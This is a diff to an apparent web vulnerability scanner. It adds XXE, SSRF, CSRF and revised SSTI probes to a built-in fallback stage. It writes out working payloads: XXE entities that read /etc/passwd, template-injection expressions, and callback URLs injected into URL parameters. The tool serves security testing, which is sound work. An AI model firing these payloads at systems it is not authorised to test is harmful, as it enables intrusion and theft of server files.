@@ -8,6 +8,8 @@ data or writing to the target.
 
 from __future__ import annotations
 
+import asyncio
+import base64
 import contextlib
 import json
 import re
@@ -22,6 +24,7 @@ import httpx
 
 from shaidra.core.events import EventBus
 from shaidra.core.models import Category, Finding, FormTarget, JsonValue, LogLevel, ScanContext, Severity
+from shaidra.utils.oob import InteractionServer
 from shaidra.utils.process import RunOptions, run_tool, stream_lines
 from shaidra.utils.rate_limiter import RateLimiter
 
@@ -30,7 +33,16 @@ MAX_INPUT: Final[int] = 500
 MAX_DALFOX: Final[int] = 50
 MAX_SQLMAP: Final[int] = 3
 MAX_OWN_PROBES: Final[int] = 120
+MAX_XXE_URLS: Final[int] = 40
+_MAX_CSRF: Final[int] = 25
+_MAX_SSRF: Final[int] = 40
+_OOB_WAIT: Final[float] = 2.5
 _OWN_TIMEOUT: Final[float] = 10.0
+_SSRF_PARAM_RE: Final[re.Pattern[str]] = re.compile(
+    r"url|uri|link|site|host|domain|dest|target|redirect|next|return|path|"
+    r"file|src|image|feed|proxy|callback|webhook|endpoint",
+    re.IGNORECASE,
+)
 _REFLECTION_MARKER: Final[str] = "sdrq<u>z9</u>k"
 _REFLECTION_TEXT: Final[str] = "sdrq"
 _CMDI_MARKER: Final[str] = "SDRm9kXq7"
@@ -50,13 +62,27 @@ _LFI_PAYLOADS: Final[tuple[str, ...]] = (
 )
 _LFI_PASSWD_RE: Final[re.Pattern[str]] = re.compile(r"root:[^:\n]*:0:0:")
 _LFI_B64_RE: Final[re.Pattern[str]] = re.compile(r"[A-Za-z0-9+/]{80,}={0,2}")
+# Expected values are high-entropy products: a 5+ digit result is extremely
+# unlikely to occur by chance in page markup or an embedded base64 blob, so a
+# match reflects a real server-side evaluation rather than a coincidence.
 _SSTI_PAYLOADS: Final[tuple[tuple[str, str], ...]] = (
-    ("{{7*7}}", "49"),
-    ("${7*7}", "49"),
-    ("#{7*7}", "49"),
-    ("<%= 7*7 %>", "49"),
+    ("{{137*177}}", "24249"),
+    ("${137*177}", "24249"),
+    ("#{137*177}", "24249"),
+    ("<%= 137*177 %>", "24249"),
     ("{{7*'7'}}", "7777777"),
 )
+_SSTI_DATA_URI_RE: Final[re.Pattern[str]] = re.compile(r"data:[^,;]*;base64,[A-Za-z0-9+/=]+", re.IGNORECASE)
+_SSTI_B64_RUN_RE: Final[re.Pattern[str]] = re.compile(r"[A-Za-z0-9+/]{60,}={0,2}")
+_XXE_PAYLOADS: Final[tuple[str, ...]] = (
+    '<?xml version="1.0" encoding="UTF-8"?>'
+    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+    "<root>&xxe;</root>",
+    '<?xml version="1.0"?>'
+    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>'
+    "<root>&xxe;</root>",
+)
+_XXE_PARAM_RE: Final[re.Pattern[str]] = re.compile(r"xml|data|body|content|input|textarea|payload", re.IGNORECASE)
 _SQL_PAYLOADS: Final[tuple[str, ...]] = ("'", '"')
 _SQL_CONTROL: Final[str] = "zqz9"
 _SQL_DIFF_RATIO: Final[float] = 0.03
@@ -155,9 +181,10 @@ async def _builtin_fallback(ctx: ScanContext, bus: EventBus) -> None:
 
     Non-destructive, read-only checks against every discovered parameter —
     query strings and form fields alike, GET or POST: reflected XSS, OS command
-    injection, path traversal / LFI, server-side template injection, and
-    differential SQL injection. Every request is throttled through RateLimiter
-    and the probe set is capped by MAX_OWN_PROBES.
+    injection, path traversal / LFI, server-side template injection, in-band
+    XXE, and differential SQL injection, plus a static anti-CSRF token check on
+    discovered forms. Every request is throttled through RateLimiter and the
+    probe set is capped by MAX_OWN_PROBES.
     """
     urls = _input_urls(ctx)
     if not urls:
@@ -167,21 +194,28 @@ async def _builtin_fallback(ctx: ScanContext, bus: EventBus) -> None:
         await bus.stage_skip(STAGE_NAME, "nuclei and dalfox not installed and target not reachable")
         return
     probes = _select_probes([*_query_probes(urls), *_form_probes(ctx.form_targets)])
-    if not probes:
-        await bus.stage_skip(STAGE_NAME, "nuclei and dalfox not installed; no parameters to test")
-        return
     await bus.log(
         f"nuclei and dalfox not installed; using built-in checks on {len(probes)} parameter(s)",
         LogLevel.WARN,
     )
     limiter = RateLimiter(float(max(1, ctx.rate_limit)))
+    server = await _start_oob(ctx)
     found = 0
-    async with httpx.AsyncClient(follow_redirects=False, timeout=_OWN_TIMEOUT) as client:
-        found += await _own_reflection(ctx, bus, client, limiter, probes)
-        found += await _own_cmdi(ctx, bus, client, limiter, probes)
-        found += await _own_lfi(ctx, bus, client, limiter, probes)
-        found += await _own_ssti(ctx, bus, client, limiter, probes)
-        found += await _own_sqli(ctx, bus, client, limiter, probes)
+    try:
+        async with httpx.AsyncClient(follow_redirects=False, timeout=_OWN_TIMEOUT) as client:
+            found += await _own_csrf(ctx, bus, ctx.form_targets)
+            found += await _own_xxe(ctx, bus, client, limiter, urls, probes)
+            if probes:
+                if server is not None:
+                    found += await _own_ssrf(ctx, bus, client, limiter, probes, server)
+                found += await _own_reflection(ctx, bus, client, limiter, probes)
+                found += await _own_cmdi(ctx, bus, client, limiter, probes)
+                found += await _own_lfi(ctx, bus, client, limiter, probes)
+                found += await _own_ssti(ctx, bus, client, limiter, probes)
+                found += await _own_sqli(ctx, bus, client, limiter, probes)
+    finally:
+        if server is not None:
+            await server.stop()
     await bus.stage_done(STAGE_NAME, f"{found} finding(s) from built-in probes")
 
 
@@ -272,6 +306,218 @@ def _deviates(actual: int, expected: int) -> bool:
     so tiny pages are not tripped by a single-character change.
     """
     return abs(actual - expected) > max(int(expected * _SQL_DIFF_RATIO), _SQL_MIN_DELTA)
+
+
+def _xxe_leaked(text: str) -> bool:
+    """Report whether a response carried /etc/passwd contents (raw or base64)."""
+    if _LFI_PASSWD_RE.search(text):
+        return True
+    for blob in _LFI_B64_RE.findall(text):
+        with contextlib.suppress(ValueError):
+            if b"root:" in base64.b64decode(blob):
+                return True
+    return False
+
+
+async def _emit_xxe(ctx: ScanContext, bus: EventBus, url: str, source: str) -> None:
+    """Raise one high-severity XXE finding for ``source``."""
+    await bus.finding(
+        Finding(
+            title="XML external entity (XXE) injection",
+            severity=Severity.HIGH,
+            category=Category.WEBVULN,
+            host=_host_of(url, ctx.target),
+            tool="shaidra",
+            url=url,
+            evidence=f"{source} resolved an external entity and returned local file contents",
+            description=(
+                "The XML parser resolves external entities, letting an attacker read local "
+                "files (e.g. /etc/passwd) or reach internal services — XML external entity "
+                "(XXE) injection."
+            ),
+            raw={"source": source},
+        )
+    )
+
+
+async def _own_xxe(
+    ctx: ScanContext,
+    bus: EventBus,
+    client: httpx.AsyncClient,
+    limiter: RateLimiter,
+    urls: Sequence[str],
+    probes: Sequence[_Probe],
+) -> int:
+    """POST XML external-entity payloads to discovered endpoints and flag file reads.
+
+    Covers both endpoints that take a raw XML body (Content-Type application/xml)
+    and forms that pass XML inside a field whose name looks XML-ish.
+    """
+    found = 0
+    for probe in probes:
+        if not _XXE_PARAM_RE.search(probe.param):
+            continue
+        response = await _probe_once(client, limiter, probe, _XXE_PAYLOADS[0])
+        if response is not None and _xxe_leaked(response.text):
+            found += 1
+            await _emit_xxe(ctx, bus, probe.url, f"{probe.method} {probe.url} [{probe.param}]")
+            break
+    targets: list[str] = []
+    seen: set[str] = set()
+    for url in [*(probe.url for probe in probes), *urls]:
+        if url in seen:
+            continue
+        seen.add(url)
+        targets.append(url)
+        if len(targets) >= MAX_XXE_URLS:
+            break
+    for url in targets:
+        for payload in _XXE_PAYLOADS:
+            await limiter.acquire()
+            try:
+                response = await client.post(
+                    url,
+                    content=payload,
+                    headers={"Content-Type": "application/xml", "Accept": "*/*"},
+                )
+            except httpx.HTTPError:
+                continue
+            if _xxe_leaked(response.text):
+                found += 1
+                await _emit_xxe(ctx, bus, url, f"POST {url} (application/xml)")
+                break
+    return found
+
+
+def _csrf_candidates(forms: Sequence[FormTarget]) -> list[FormTarget]:
+    """State-changing POST forms that carry no obvious anti-CSRF token field."""
+    selected: dict[tuple[str, str], FormTarget] = {}
+    for form in forms:
+        if form.method != "POST" or form.has_csrf_token or not form.fields:
+            continue
+        selected.setdefault((form.action_url, form.method), form)
+    return list(selected.values())
+
+
+async def _own_csrf(ctx: ScanContext, bus: EventBus, forms: Sequence[FormTarget]) -> int:
+    """Report state-changing POST forms that submit without an anti-CSRF token.
+
+    Emitted once per scan as a summary so a target with many tokenless forms
+    does not flood the report; the individual actions are listed in the body.
+    """
+    candidates = _csrf_candidates(forms)
+    if not candidates:
+        return 0
+    shown = candidates[:_MAX_CSRF]
+    listing = "\n".join(f"- POST {form.action_url} (from {form.page_url})" for form in shown)
+    if len(candidates) > len(shown):
+        listing += f"\n- (+{len(candidates) - len(shown)} more)"
+    await bus.finding(
+        Finding(
+            title="Missing anti-CSRF tokens on state-changing forms",
+            severity=Severity.LOW,
+            category=Category.WEBVULN,
+            host=_host_of(shown[0].action_url, ctx.target),
+            tool="shaidra",
+            url=shown[0].action_url,
+            evidence=f"{len(candidates)} POST form(s) submit without an anti-CSRF token",
+            description=(
+                "These forms submit state-changing POST requests without an anti-CSRF token. If the "
+                "session is cookie-based, a cross-site request may trigger the action (CSRF). "
+                "Confirm each manually:\n" + listing
+            ),
+            raw={"count": len(candidates), "forms": [form.to_dict() for form in shown]},
+        )
+    )
+    return 1
+
+
+def _loopback_host(host: str) -> bool:
+    """Whether ``host`` names this machine (so a local callback listener is reachable)."""
+    return host in {"127.0.0.1", "localhost", "::1", "0.0.0.0", ""}
+
+
+async def _start_oob(ctx: ScanContext) -> InteractionServer | None:
+    """Start the callback listener when an SSRF callback could actually return.
+
+    A loopback listener is only reachable when the target runs locally; for a
+    remote target, an ``oob_host`` (public forwarding host) must be configured.
+    """
+    host = urlsplit(ctx.target_url).hostname or ""
+    if not (ctx.config.oob_host or _loopback_host(host)):
+        return None
+    server = InteractionServer()
+    with contextlib.suppress(OSError):
+        await server.start()
+    return server if server.running else None
+
+
+def _ssrf_candidates(probes: Sequence[_Probe]) -> list[_Probe]:
+    """URL-ish parameters a server is most likely to fetch on our behalf."""
+    selected: list[_Probe] = []
+    seen: set[tuple[str, str, str]] = set()
+    for probe in probes:
+        if not _SSRF_PARAM_RE.search(probe.param):
+            continue
+        key = (probe.method, probe.url, probe.param.lower())
+        if key in seen:
+            continue
+        seen.add(key)
+        selected.append(probe)
+        if len(selected) >= _MAX_SSRF:
+            break
+    return selected
+
+
+async def _own_ssrf(
+    ctx: ScanContext,
+    bus: EventBus,
+    client: httpx.AsyncClient,
+    limiter: RateLimiter,
+    probes: Sequence[_Probe],
+    server: InteractionServer,
+) -> int:
+    """Inject callback URLs into URL-ish parameters and flag server-side fetches.
+
+    Every request is sent first, then Shaidra waits once for callbacks, so the
+    wait is paid a single time regardless of how many parameters were tested.
+    """
+    callback_host = ctx.config.oob_host or "127.0.0.1"
+    pending: list[tuple[_Probe, str]] = []
+    for probe in _ssrf_candidates(probes):
+        token = server.new_token()
+        response = await _probe_once(client, limiter, probe, server.callback_url(token, callback_host))
+        if response is not None:
+            pending.append((probe, token))
+    if not pending:
+        return 0
+    await asyncio.sleep(_OOB_WAIT)
+    found = 0
+    for probe, token in pending:
+        if not server.received(token):
+            continue
+        found += 1
+        await bus.finding(
+            Finding(
+                title="Server-side request forgery (SSRF)",
+                severity=Severity.HIGH,
+                category=Category.WEBVULN,
+                host=_host_of(probe.url, ctx.target),
+                tool="shaidra",
+                url=probe.url,
+                evidence=(
+                    f"{probe.method} {probe.url} [{probe.param}] made the server fetch "
+                    f"{server.callback_url(token, callback_host)}"
+                ),
+                description=(
+                    f"The {probe.param!r} parameter makes the server request an attacker-supplied "
+                    "URL. A callback to Shaidra's listener proves outbound server-side request "
+                    "forgery (SSRF), which can reach internal services or cloud metadata."
+                ),
+                raw={"param": probe.param, "method": probe.method, "token": token},
+            )
+        )
+    return found
 
 
 async def _own_reflection(
@@ -379,6 +625,17 @@ async def _own_lfi(
     return found
 
 
+def _ssti_visible_text(text: str) -> str:
+    """Strip embedded base64 blobs so random image data cannot fake a match.
+
+    Pages frequently carry inline data-URI images whose base64 body is a long
+    run of alphanumerics. A short expected value can appear inside that run by
+    chance (and the blob is regenerated per request, so the baseline does not
+    exclude it), so the comparison runs on markup with those blobs removed.
+    """
+    return _SSTI_B64_RUN_RE.sub(" ", _SSTI_DATA_URI_RE.sub(" ", text))
+
+
 async def _own_ssti(
     ctx: ScanContext, bus: EventBus, client: httpx.AsyncClient, limiter: RateLimiter, probes: Sequence[_Probe]
 ) -> int:
@@ -386,12 +643,12 @@ async def _own_ssti(
     found = 0
     for probe in probes:
         baseline = await _probe_once(client, limiter, probe, _benign_value(probe))
-        baseline_text = baseline.text if baseline is not None else ""
+        baseline_text = _ssti_visible_text(baseline.text) if baseline is not None else ""
         for payload, expected in _SSTI_PAYLOADS:
             response = await _probe_once(client, limiter, probe, payload)
             if response is None:
                 continue
-            if expected in response.text and expected not in baseline_text:
+            if expected in _ssti_visible_text(response.text) and expected not in baseline_text:
                 found += 1
                 await bus.finding(
                     Finding(
